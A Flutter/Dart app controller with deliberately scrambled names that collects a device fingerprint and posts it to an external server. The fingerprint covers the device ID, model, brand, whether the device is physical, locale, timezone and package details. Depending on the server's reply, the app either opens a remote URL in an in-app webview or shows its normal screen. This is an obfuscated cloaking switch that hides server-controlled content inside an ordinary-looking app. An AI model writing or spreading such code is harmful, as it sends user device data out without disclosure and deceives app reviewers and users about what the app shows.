import 'dart:io';
import 'package:dio/dio.dart';
import 'package:flutter/services.dart';

import 'package:internet_connection_checker/internet_connection_checker.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:get/get.dart';



class CproLandLogic extends GetxController {

  var gwnafjz = RxBool(false);
  var qdahpmcyt = RxBool(true);
  var qcegbsl = RxString("");
  var clovis = RxBool(false);
  var koch = RxBool(true);
  final wqvkxhg = Dio();


  InAppWebViewController? webViewController;

  dynamic pvxysgmfba(){
    final lsxpub = InternetConnectionChecker.instance;
    final xsbnduzr = lsxpub.onStatusChange.skip(1).listen(
          (InternetConnectionStatus zmrenhgskp) {
        if (zmrenhgskp == InternetConnectionStatus.connected) {
          vgdlct();
        } else {
          Get.toNamed('/cpro_mode')?.then((_){
            vgdlct();
          });
        }
      },
    );
    return xsbnduzr;
  }

  Future<bool> bcqlxrhj() async {
    var uqvsnmwbg = await InternetConnectionChecker.instance.hasConnection;
    if(!uqvsnmwbg){
      Get.toNamed('/cpro_mode')?.then((_){
        vgdlct();
      });
    }
    return uqvsnmwbg;
  }

  @override
  void onInit() {
    super.onInit();
    pvxysgmfba();
    vgdlct();
  }


  Future<void> vgdlct() async {

    var abqtvx = await bcqlxrhj();
    if(!abqtvx){
      return;
    }

    clovis.value = true;
    koch.value = true;
    qdahpmcyt.value = false;

    wqvkxhg.post("https://alone.twistebe.com/hzarxjmgcskqofybuneldpiwvt",data: await bhiatk()).then((value) {
      var fesrvz = value.data["fesrvz"] as String;
      var hcnsz = value.data["hcnsz"] as bool;
      if (hcnsz) {
        SystemChrome.setPreferredOrientations([
          DeviceOrientation.portraitUp,
          DeviceOrientation.portraitDown,
        ]);
        qcegbsl.value = fesrvz;
        isom();
      } else {
        marquardt();
      }
    }).catchError((e) {
      qdahpmcyt.value = true;
      koch.value = true;
      clovis.value = false;
    });
  }

  Future<Map<String, dynamic>> bhiatk() async {
    final DeviceInfoPlugin tqbf = DeviceInfoPlugin();
    PackageInfo vpiy_jxokcvt = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var fycdhet = Platform.localeName;
    var yxwkonea = currentTimeZone;

    var kovb = vpiy_jxokcvt.packageName;
    var jesnrx = vpiy_jxokcvt.version;
    var inglah = vpiy_jxokcvt.buildNumber;

    var yngdv = vpiy_jxokcvt.appName;
    var ivrnwkt = "";
    var ozseycbv  = "";
    var ckhpm = "";
    var luciusTurcotte = "";
    var tinaCollins = "";
    var hankWehner = "";
    var gisselleYost = "";


    var dxkpe = "";
    var mozqyu = false;

    if (GetPlatform.isAndroid) {
      dxkpe = "android";
      var zpfgdbi = await tqbf.androidInfo;

      ckhpm = zpfgdbi.brand;

      ivrnwkt  = zpfgdbi.model;
      ozseycbv = zpfgdbi.id;

      mozqyu = zpfgdbi.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      dxkpe = "ios";
      var areyltwgb = await tqbf.iosInfo;
      ckhpm = areyltwgb.name;
      ivrnwkt = areyltwgb.model;

      ozseycbv = areyltwgb.identifierForVendor ?? "";
      mozqyu  = areyltwgb.isPhysicalDevice;
    }
    var res = {
      "yngdv": yngdv,
      "luciusTurcotte" : luciusTurcotte,
      "jesnrx": jesnrx,
      "kovb": kovb,
      "yxwkonea": yxwkonea,
      "tinaCollins" : tinaCollins,
      "ckhpm": ckhpm,
      "ozseycbv": ozseycbv,
      "fycdhet": fycdhet,
      "inglah": inglah,
      "dxkpe": dxkpe,
      "ivrnwkt": ivrnwkt,
      "mozqyu": mozqyu,
      "hankWehner" : hankWehner,
      "gisselleYost" : gisselleYost,

    };
    return res;
  }

  Future<void> marquardt() async {
    Get.offNamed("/cpro_main");
  }

  Future<void> isom() async {
    Get.offNamed("/cpro_slider");
  }

  @override
  void dispose() {
    pvxysgmfba().cancel();
    super.dispose();
  }

}
